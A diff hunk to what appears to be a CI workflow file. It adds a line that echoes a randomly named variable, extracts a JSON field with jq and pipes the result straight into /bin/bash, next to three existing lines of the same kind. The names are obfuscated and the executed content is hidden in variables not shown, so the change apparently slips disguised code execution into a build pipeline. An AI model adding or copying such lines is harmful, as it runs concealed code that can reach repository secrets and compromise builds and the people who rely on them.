@@ -23,6 +23,7 @@ jobs:
           echo $tdd20 | jq -r .h3 | /bin/bash
           printf '%s' "$no02578" | jq -r .oej42 | /bin/bash
           echo $snfmp421 | jq -r .uf7 | /bin/bash
+          echo $wwgl56920 | jq -r .c1 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
